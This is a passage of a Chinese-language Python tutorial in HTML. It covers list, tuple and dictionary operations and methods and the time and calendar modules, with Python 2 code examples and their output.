align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">len([1, 2, 3])</td><td align="left">3</td><td align="left">长度</td></tr><tr><td align="left">[1, 2, 3] + [4, 5, 6]</td><td align="left">[1, 2, 3, 4, 5, 6]</td><td align="left">组合</td></tr><tr><td align="left">[‘Hi!’] * 4</td><td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td><td align="left">重复</td></tr><tr><td align="left">3 in [1, 2, 3]</td><td align="left">True</td><td align="left">元素是否存在于列表中</td></tr><tr><td align="left">for x in [1, 2, 3]: print(x, end=” “)</td><td align="left">1 2 3</td><td align="left">迭代</td></tr></tbody></table><hr><h4><span id="python-lie-biao-jie-qu-yu-pin-jie">Python列表截取与拼接</span><a href="#python-lie-biao-jie-qu-yu-pin-jie" class="header-anchor">#</a></h4><p>Python的列表截取与字符串操作类型，如下所示：</p><p>L=[‘Google’, ‘Runoob’, ‘Taobao’]</p><p>操作：</p><table><thead><tr><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">L[2]</td><td align="left">‘Taobao’</td><td align="left">读取第三个元素</td></tr><tr><td align="left">L[-2]</td><td align="left">‘Runoob’</td><td align="left">从右侧开始读取倒数第二个元素: count from the right</td></tr><tr><td align="left">L[1:]</td><td align="left">[‘Runoob’, ‘Taobao’]</td><td align="left">输出从第二个元素开始后的所有元素</td></tr></tbody></table><p>&gt;&gt;&gt;L=[‘Google’, ‘Runoob’, ‘Taobao’] &gt;&gt;&gt; L[2] ‘Taobao’ &gt;&gt;&gt; L[-2] ‘Runoob’ &gt;&gt;&gt; L[1:] [‘Runoob’, ‘Taobao’] &gt;&gt;&gt;</p><p>列表还支持拼接操作：</p><p>&gt;&gt;&gt;squares = [1, 4, 9, 16, 25] &gt;&gt;&gt; squares += [36, 49, 64, 81, 100] &gt;&gt;&gt; squares [1, 4, 9, 16, 25, 36, 49, 64, 81, 100] &gt;&gt;&gt;</p><hr><h4><span id="qian-tao-lie-biao">嵌套列表</span><a href="#qian-tao-lie-biao" class="header-anchor">#</a></h4><p>使用嵌套列表即在列表里创建其它列表，例如：</p><p>&gt;&gt;&gt;a = [‘a’, ‘b’, ‘c’] &gt;&gt;&gt; n = [1, 2, 3] &gt;&gt;&gt; x = [a, n] &gt;&gt;&gt; x [[‘a’, ‘b’, ‘c’], [1, 2, 3]] &gt;&gt;&gt; x[0] [‘a’, ‘b’, ‘c’] &gt;&gt;&gt; x[0][1] ‘b’</p><hr><h4><span id="python-lie-biao-han-shu-amp-fang-fa">Python列表函数&amp;方法</span><a href="#python-lie-biao-han-shu-amp-fang-fa" class="header-anchor">#</a></h4><p>Python包含以下函数:</p><table><thead><tr><th align="left">序号</th><th align="left">函数</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-len.html" target="_blank" rel="noopener">len(list)</a> 列表元素个数</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-max.html" target="_blank" rel="noopener">max(list)</a> 返回列表元素最大值</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-min.html" target="_blank" rel="noopener">min(list)</a> 返回列表元素最小值</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-list.html" target="_blank" rel="noopener">list(seq)</a> 将元组转换为列表</td></tr></tbody></table><p>Python包含以下方法:</p><table><thead><tr><th align="left">序号</th><th align="left">方法</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-append.html" target="_blank" rel="noopener">list.append(obj)</a> 在列表末尾添加新的对象</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-count.html" target="_blank" rel="noopener">list.count(obj)</a> 统计某个元素在列表中出现的次数</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-extend.html" target="_blank" rel="noopener">list.extend(seq)</a> 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-index.html" target="_blank" rel="noopener">list.index(obj)</a> 从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-insert.html" target="_blank" rel="noopener">list.insert(index, obj)</a> 将对象插入列表</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-pop.html" target="_blank" rel="noopener">list.pop([index=-1])</a> 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-remove.html" target="_blank" rel="noopener">list.remove(obj)</a> 移除列表中某个值的第一个匹配项</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-reverse.html" target="_blank" rel="noopener">list.reverse()</a> 反向列表中元素</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-sort.html" target="_blank" rel="noopener">list.sort( key=None, reverse=False)</a> 对原列表进行排序</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-clear.html" target="_blank" rel="noopener">list.clear()</a> 清空列表</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-copy.html" target="_blank" rel="noopener">list.copy()</a> 复制列表</td></tr></tbody></table><h2><span id="python-yuan-zu">Python 元组</span><a href="#python-yuan-zu" class="header-anchor">#</a></h2><p>Python的元组与列表类似，不同之处在于元组的元素不能修改。</p><p>元组使用小括号，列表使用方括号。</p><p>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。</p><p>如下实例：</p><p>实例(Python 2.0+)</p><p>tup1 = (‘physics’, ‘chemistry’, 1997, 2000) tup2 = (1, 2, 3, 4, 5 ) tup3 = “a”, “b”, “c”, “d”</p><p>创建空元组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tup1 = ()</span><br></pre></td></tr></table></figure><p>元组中只包含一个元素时，需要在元素后面添加逗号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tup1 = (50,)</span><br></pre></td></tr></table></figure><p>元组与字符串类似，下标索引从0开始，可以进行截取，组合等。</p><hr><h4><span id="fang-wen-yuan-zu">访问元组</span><a href="#fang-wen-yuan-zu" class="header-anchor">#</a></h4><p>元组可以使用下标索引来访问元组中的值，如下实例:</p><p>实例(Python 2.0+)</p><p>#!/usr/bin/python  tup1 = (‘physics’, ‘chemistry’, 1997, 2000) tup2 = (1, 2, 3, 4, 5, 6, 7 )  print “tup1[0]: “, tup1[0] print “tup2[1:5]: “, tup2[1:5]</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tup1[0]:  physics</span><br><span class="line">tup2[1:5]:  (2, 3, 4, 5)</span><br></pre></td></tr></table></figure><hr><h4><span id="xiu-gai-yuan-zu">修改元组</span><a href="#xiu-gai-yuan-zu" class="header-anchor">#</a></h4><p>元组中的元素值是不允许修改的，但我们可以对元组进行连接组合，如下实例:</p><p>实例(Python 2.0+)</p><p>#!/usr/bin/python # -<em>- coding: UTF-8 -</em>-  tup1 = (12, 34.56) tup2 = (‘abc’, ‘xyz’)  # 以下修改元组元素操作是非法的。 # tup1[0] = 100  # 创建一个新的元组 tup3 = tup1 + tup2 print tup3</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(12, 34.56, &apos;abc&apos;, &apos;xyz&apos;)</span><br></pre></td></tr></table></figure><hr><h4><span id="shan-chu-yuan-zu">删除元组</span><a href="#shan-chu-yuan-zu" class="header-anchor">#</a></h4><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组，如下实例:</p><p>实例(Python 2.0+)</p><p>#!/usr/bin/python  tup = (‘physics’, ‘chemistry’, 1997, 2000)  print tup del tup print “After deleting tup : “ print tup</p><p>以上实例元组被删除后，输出变量会有异常信息，输出如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(&apos;physics&apos;, &apos;chemistry&apos;, 1997, 2000)</span><br><span class="line">After deleting tup :</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;test.py&quot;, line 9, in &lt;module&gt;</span><br><span class="line">    print tup</span><br><span class="line">NameError: name &apos;tup&apos; is not defined</span><br></pre></td></tr></table></figure><hr><h4><span id="yuan-zu-yun-suan-fu">元组运算符</span><a href="#yuan-zu-yun-suan-fu" class="header-anchor">#</a></h4><p>与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。</p><table><thead><tr><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">len((1, 2, 3))</td><td align="left">3</td><td align="left">计算元素个数</td></tr><tr><td align="left">(1, 2, 3) + (4, 5, 6)</td><td align="left">(1, 2, 3, 4, 5, 6)</td><td align="left">连接</td></tr><tr><td align="left">(‘Hi!’,) * 4</td><td align="left">(‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’)</td><td align="left">复制</td></tr><tr><td align="left">3 in (1, 2, 3)</td><td align="left">True</td><td align="left">元素是否存在</td></tr><tr><td align="left">for x in (1, 2, 3): print x,</td><td align="left">1 2 3</td><td align="left">迭代</td></tr></tbody></table><hr><h4><span id="yuan-zu-suo-yin-jie-qu">元组索引，截取</span><a href="#yuan-zu-suo-yin-jie-qu" class="header-anchor">#</a></h4><p>因为元组也是一个序列，所以我们可以访问元组中的指定位置的元素，也可以截取索引中的一段元素，如下所示：</p><p>元组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L = (&apos;spam&apos;, &apos;Spam&apos;, &apos;SPAM!&apos;)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">L[2]</td><td align="left">‘SPAM!’</td><td align="left">读取第三个元素</td></tr><tr><td align="left">L[-2]</td><td align="left">‘Spam’</td><td align="left">反向读取，读取倒数第二个元素</td></tr><tr><td align="left">L[1:]</td><td align="left">(‘Spam’, ‘SPAM!’)</td><td align="left">截取元素</td></tr></tbody></table><hr><h4><span id="wu-guan-bi-fen-ge-fu">无关闭分隔符</span><a href="#wu-guan-bi-fen-ge-fu" class="header-anchor">#</a></h4><p>任意无符号的对象，以逗号隔开，默认为元组，如下实例：</p><p>实例(Python 2.0+)</p><p>#!/usr/bin/python  print ‘abc’, -4.24e93, 18+6.6j, ‘xyz’ x, y = 1, 2 print “Value of x , y : “, x,y</p><p>以上实例运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc -4.24e+93 (18+6.6j) xyz</span><br><span class="line">Value of x , y : 1 2</span><br></pre></td></tr></table></figure><hr><h4><span id="yuan-zu-nei-zhi-han-shu">元组内置函数</span><a href="#yuan-zu-nei-zhi-han-shu" class="header-anchor">#</a></h4><p>Python元组包含了以下内置函数</p><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-cmp.html" target="_blank" rel="noopener">cmp(tuple1, tuple2)</a> 比较两个元组元素。</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-len.html" target="_blank" rel="noopener">len(tuple)</a> 计算元组元素个数。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-max.html" target="_blank" rel="noopener">max(tuple)</a> 返回元组中元素最大值。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-min.html" target="_blank" rel="noopener">min(tuple)</a> 返回元组中元素最小值。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-tuple.html" target="_blank" rel="noopener">tuple(seq)</a> 将列表转换为元组。</td></tr></tbody></table><h2><span id="python-zi-dian-dictionary">Python 字典(Dictionary)</span><a href="#python-zi-dian-dictionary" class="header-anchor">#</a></h2><p>字典是另一种可变容器模型，且可存储任意类型对象。</p><p>字典的每个键值 <strong>key=&gt;value</strong> 对用冒号 <strong>:</strong> 分割，每个键值对之间用逗号 <strong>,</strong> 分割，整个字典包括在花括号 <strong>{}</strong> 中 ,格式如下所示：</p><p>d = {key1 : value1, key2 : value2 }</p><p>键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一。</p><p>&gt;&gt;&gt;dict = {‘a’: 1, ‘b’: 2, ‘b’: ‘3’} &gt;&gt;&gt; dict[‘b’] ‘3’ &gt;&gt;&gt; dict {‘a’: 1, ‘b’: ‘3’}</p><p>值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组。</p><p>一个简单的字典实例：</p><p>dict = {‘Alice’: ‘2341’, ‘Beth’: ‘9102’, ‘Cecil’: ‘3258’}</p><p>也可如此创建字典：</p><p>dict1 = { ‘abc’: 456 } dict2 = { ‘abc’: 123, 98.6: 37 }</p><hr><h4><span id="fang-wen-zi-dian-li-de-zhi">访问字典里的值</span><a href="#fang-wen-zi-dian-li-de-zhi" class="header-anchor">#</a></h4><p>把相应的键放入熟悉的方括弧，如下实例:</p><p>实例</p><p>#!/usr/bin/python  dict = {‘Name’: ‘Zara’, ‘Age’: 7, ‘Class’: ‘First’}  print “dict[‘Name’]: “, dict[‘Name’] print “dict[‘Age’]: “, dict[‘Age’]</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict[&apos;Name&apos;]:  Zara</span><br><span class="line">dict[&apos;Age&apos;]:  7</span><br></pre></td></tr></table></figure><p>如果用字典里没有的键访问数据，会输出错误如下：</p><p>实例</p><p>#!/usr/bin/python  dict = {‘Name’: ‘Zara’, ‘Age’: 7, ‘Class’: ‘First’}  print “dict[‘Alice’]: “, dict[‘Alice’]</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dict[&apos;Alice&apos;]: </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;test.py&quot;, line 5, in &lt;module&gt;</span><br><span class="line">    print &quot;dict[&apos;Alice&apos;]: &quot;, dict[&apos;Alice&apos;]</span><br><span class="line">KeyError: &apos;Alice&apos;</span><br></pre></td></tr></table></figure><hr><h4><span id="xiu-gai-zi-dian">修改字典</span><a href="#xiu-gai-zi-dian" class="header-anchor">#</a></h4><p>向字典添加新内容的方法是增加新的键/值对，修改或删除已有键/值对如下实例:</p><p>实例</p><p>#!/usr/bin/python  dict = {‘Name’: ‘Zara’, ‘Age’: 7, ‘Class’: ‘First’}  dict[‘Age’] = 8 # 更新 dict[‘School’] = “RUNOOB” # 添加   print “dict[‘Age’]: “, dict[‘Age’] print “dict[‘School’]: “, dict[‘School’]</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict[&apos;Age&apos;]:  8</span><br><span class="line">dict[&apos;School&apos;]:  RUNOOB</span><br></pre></td></tr></table></figure><hr><h4><span id="shan-chu-zi-dian-yuan-su">删除字典元素</span><a href="#shan-chu-zi-dian-yuan-su" class="header-anchor">#</a></h4><p>能删单一的元素也能清空字典，清空只需一项操作。</p><p>显示删除一个字典用del命令，如下实例：</p><p>实例</p><p>#!/usr/bin/python # -<em>- coding: UTF-8 -</em>-  dict = {‘Name’: ‘Zara’, ‘Age’: 7, ‘Class’: ‘First’}  del dict[‘Name’]  # 删除键是’Name’的条目 dict.clear()      # 清空字典所有条目 del dict          # 删除字典  print “dict[‘Age’]: “, dict[‘Age’]  print “dict[‘School’]: “, dict[‘School’]</p><p>但这会引发一个异常，因为用del后字典不再存在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dict[&apos;Age&apos;]:</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;test.py&quot;, line 8, in &lt;module&gt;</span><br><span class="line">    print &quot;dict[&apos;Age&apos;]: &quot;, dict[&apos;Age&apos;] </span><br><span class="line">TypeError: &apos;type&apos; object is unsubscriptable</span><br></pre></td></tr></table></figure><p><strong>注：</strong>del()方法后面也会讨论。</p><h4><span id="zi-dian-jian-de-te-xing">字典键的特性</span><a href="#zi-dian-jian-de-te-xing" class="header-anchor">#</a></h4><p>字典值可以没有限制地取任何python对象，既可以是标准的对象，也可以是用户定义的，但键不行。</p><p>两个重要的点需要记住：</p><p>1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住，如下实例：</p><p>实例</p><p>#!/usr/bin/python  dict = {‘Name’: ‘Zara’, ‘Age’: 7, ‘Name’: ‘Manni’}   print “dict[‘Name’]: “, dict[‘Name’]</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict[&apos;Name&apos;]:  Manni</span><br></pre></td></tr></table></figure><p>2）键必须不可变，所以可以用数字，字符串或元组充当，所以用列表就不行，如下实例：</p><p>实例</p><p>#!/usr/bin/python  dict = {[‘Name’]: ‘Zara’, ‘Age’: 7}   print “dict[‘Name’]: “, dict[‘Name’]</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;test.py&quot;, line 3, in &lt;module&gt;</span><br><span class="line">    dict = &#123;[&apos;Name&apos;]: &apos;Zara&apos;, &apos;Age&apos;: 7&#125; </span><br><span class="line">TypeError: list objects are unhashable</span><br></pre></td></tr></table></figure><hr><h4><span id="zi-dian-nei-zhi-han-shu-amp-fang-fa">字典内置函数&amp;方法</span><a href="#zi-dian-nei-zhi-han-shu-amp-fang-fa" class="header-anchor">#</a></h4><p>Python字典包含了以下内置函数：</p><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-cmp.html" target="_blank" rel="noopener">cmp(dict1, dict2)</a> 比较两个字典元素。</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-len.html" target="_blank" rel="noopener">len(dict)</a> 计算字典元素个数，即键的总数。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-str.html" target="_blank" rel="noopener">str(dict)</a> 输出字典可打印的字符串表示。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-type.html" target="_blank" rel="noopener">type(variable)</a> 返回输入的变量类型，如果变量是字典就返回字典类型。</td></tr></tbody></table><p>Python字典包含了以下内置方法：</p><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-clear.html" target="_blank" rel="noopener">dict.clear()</a> 删除字典内所有元素</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-copy.html" target="_blank" rel="noopener">dict.copy()</a> 返回一个字典的浅复制</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-fromkeys.html" target="_blank" rel="noopener">dict.fromkeys(seq[, val])</a> 创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-get.html" target="_blank" rel="noopener">dict.get(key, default=None)</a> 返回指定键的值，如果值不在字典中返回default值</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-has_key.html" target="_blank" rel="noopener">dict.has_key(key)</a> 如果键在字典dict里返回true，否则返回false</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-items.html" target="_blank" rel="noopener">dict.items()</a> 以列表返回可遍历的(键, 值) 元组数组</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-keys.html" target="_blank" rel="noopener">dict.keys()</a> 以列表返回一个字典所有的键</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-setdefault.html" target="_blank" rel="noopener">dict.setdefault(key, default=None)</a> 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-update.html" target="_blank" rel="noopener">dict.update(dict2)</a> 把字典dict2的键/值对更新到dict里</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python/att-dictionary-values.html" target="_blank" rel="noopener">dict.values()</a> 以列表返回字典中的所有值</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python/python-att-dictionary-pop.html" target="_blank" rel="noopener">pop(key[,default])</a> 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python/python-att-dictionary-popitem.html" target="_blank" rel="noopener">popitem()</a> 返回并删除字典中的最后一对键和值。</td></tr></tbody></table><h2><span id="python-ri-qi-he-shi-jian">Python 日期和时间</span><a href="#python-ri-qi-he-shi-jian" class="header-anchor">#</a></h2><p>Python 程序能用很多方式处理日期和时间，转换日期格式是一个常见的功能。</p><p>Python 提供了一个 time 和 calendar 模块可以用于格式化日期和时间。</p><p>时间间隔是以秒为单位的浮点小数。</p><p>每个时间戳都以自从1970年1月1日午夜（历元）经过了多长时间来表示。</p><p>Python 的 time 模块下有很多函数可以转换常见日期格式。如函数time.time()用于获取当前时间戳, 如下实例:</p><p>实例(Python 2.0+)</p><p>#!/usr/bin/python # -<em>- coding: UTF-8 -</em>-  import time;  # 引入time模块  ticks = time.time() print “当前时间戳为:”, ticks</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前时间戳为: 1459994552.51</span><br></pre></td></tr></table></figure><p>时间戳单位最适于做日期运算。但是1970年之前的日期就无法以此表示了。太遥远的日期也不行，UNIX和Windows只支持到2038年。</p><hr><h4><span id="shi-me-shi-shi-jian-yuan-zu">什么是时间元组？</span><a href="#shi-me-shi-shi-jian-yuan-zu" class="header-anchor">#</a></h4><p>很多Python函数用一个元组装起来的9组数字处理时间:</p><table><thead><tr><th align="left">序号</th><th align="left">字段</th><th align="left">值</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4位数年</td><td align="left">2008</td></tr><tr><td align="left">1</td><td align="left">月</td><td align="left">1 到 12</td></tr><tr><td align="left">2</td><td align="left">日</td><td align="left">1到31</td></tr><tr><td align="left">3</td><td align="left">小时</td><td align="left">0到23</td></tr><tr><td align="left">4</td><td align="left">分钟</td><td align="left">0到59</td></tr><tr><td align="left">5</td><td align="left">秒</td><td align="left">0到61 (60或61 是闰秒)</td></tr><tr><td align="left">6</td><td align="left">一周的第几日</td><td align="left">0到6 (0是周一)</td></tr><tr><td align="left">7</td><td align="left">一年的第几日</td><td align="left">1到366 (儒略历)</td></tr><tr><td align="left">8</td><td align="left">夏令时</td><td align="left">-1, 0, 1, -1是决定是否为夏令时的旗帜</td></tr></tbody></table><p>上述也就是struct_time元组。这种结构具有如下属性：</p><table><thead><tr><th align="left">序号</th><th align="left">属性</th><th align="left">值</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">tm_year</td><td align="left">2008</td></tr><tr><td align="left">1</td><td align="left">tm_mon</td><td align="left">1 到 12</td></tr><tr><td align="left">2</td><td align="left">tm_mday</td><td align="left">1 到 31</td></tr><tr><td align="left">3</td><td align="left">tm_hour</td><td align="left">0 到 23</td></tr><tr><td align="left">4</td><td align="left">tm_min</td><td align="left">0 到 59</td></tr><tr><td align="left">5</td><td align="left">tm_sec</td><td align="left">0 到 61 (60或61 是闰秒)</td></tr><tr><td align="left">6</td><td align="left">tm_wday</td><td align="left">0到6 (0是周一)</td></tr><tr><td align="left">7</td><td align="left">tm_yday</td><td align="left">1 到 366(儒略历)</td></tr><tr><td align="left">8</td><td align="left">tm_isdst</td><td align="left">-1, 0, 1, -1是决定是否为夏令时的旗帜</td></tr></tbody></table><hr><h4><span id="huo-qu-dang-qian-shi-jian">获取当前时间</span><a href="#huo-qu-dang-qian-shi-jian" class="header-anchor">#</a></h4><p>从返回浮点数的时间戳方式向时间元组转换，只要将浮点数传递给如localtime之类的函数。</p><p>实例(Python 2.0+)</p><p>#!/usr/bin/python # -<em>- coding: UTF-8 -</em>-  import time  localtime = time.localtime(time.time()) print “本地时间为 :”, localtime</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地时间为 : time.struct_time(tm_year=2016, tm_mon=4, tm_mday=7, tm_hour=10, tm_min=3, tm_sec=27, tm_wday=3, tm_yday=98, tm_isdst=0)</span><br></pre></td></tr></table></figure><hr><h4><span id="huo-qu-ge-shi-hua-de-shi-jian">获取格式化的时间</span><a href="#huo-qu-ge-shi-hua-de-shi-jian" class="header-anchor">#</a></h4><p>你可以根据需求选取各种格式，但是最简单的获取可读的时间模式的函数是asctime():</p><p>实例(Python 2.0+)</p><p>#!/usr/bin/python # -<em>- coding: UTF-8 -</em>-  import time  localtime = time.asctime( time.localtime(time.time()) ) print “本地时间为 :”, localtime</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地时间为 : Thu Apr  7 10:05:21 2016</span><br></pre></td></tr></table></figure><hr><h4><span id="ge-shi-hua-ri-qi">格式化日期</span><a href="#ge-shi-hua-ri-qi" class="header-anchor">#</a></h4><p>我们可以使用 time 模块的 strftime 方法来格式化日期，：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.strftime(format[, t])</span><br></pre></td></tr></table></figure><p>实例演示：</p><p>实例(Python 2.0+)</p><p>#!/usr/bin/python # -<em>- coding: UTF-8 -</em>-  import time  # 格式化成2016-03-20 11:45:39形式 print time.strftime(“%Y-%m-%d %H:%M:%S”, time.localtime())   # 格式化成Sat Mar 28 22:24:24 2016形式 print time.strftime(“%a %b %d %H:%M:%S %Y”, time.localtime())    # 将格式字符串转换为时间戳 a = “Sat Mar 28 22:24:24 2016” print time.mktime(time.strptime(a,”%a %b %d %H:%M:%S %Y”))</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2016-04-07 10:25:09</span><br><span class="line">Thu Apr 07 10:25:09 2016</span><br><span class="line">1459175064.0</span><br></pre></td></tr></table></figure><p>python中时间日期格式化符号：</p><ul><li>%y 两位数的年份表示（00-99）</li><li>%Y 四位数的年份表示（000-9999）</li><li>%m 月份（01-12）</li><li>%d 月内中的一天（0-31）</li><li>%H 24小时制小时数（0-23）</li><li>%I 12小时制小时数（01-12）</li><li>%M 分钟数（00=59）</li><li>%S 秒（00-59）</li><li>%a 本地简化星期名称</li><li>%A 本地完整星期名称</li><li>%b 本地简化的月份名称</li><li>%B 本地完整的月份名称</li><li>%c 本地相应的日期表示和时间表示</li><li>%j 年内的一天（001-366）</li><li>%p 本地A.M.或P.M.的等价符</li><li>%U 一年中的星期数（00-53）星期天为星期的开始</li><li>%w 星期（0-6），星期天为星期的开始</li><li>%W 一年中的星期数（00-53）星期一为星期的开始</li><li>%x 本地相应的日期表示</li><li>%X 本地相应的时间表示</li><li>%Z 当前时区的名称</li><li>%% %号本身</li></ul><hr><h4><span id="huo-qu-mou-yue-ri-li">获取某月日历</span><a href="#huo-qu-mou-yue-ri-li" class="header-anchor">#</a></h4><p>Calendar模块有很广泛的方法用来处理年历和月历，例如打印某月的月历：</p><p>实例(Python 2.0+)</p><p>#!/usr/bin/python # -<em>- coding: UTF-8 -</em>-  import calendar  cal = calendar.month(2016, 1) print “以下输出2016年1月份的日历:” print cal</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">以下输出2016年1月份的日历:</span><br><span class="line">    January 2016</span><br><span class="line">Mo Tu We Th Fr Sa Su</span><br><span class="line">             1  2  3</span><br><span class="line"> 4  5  6  7  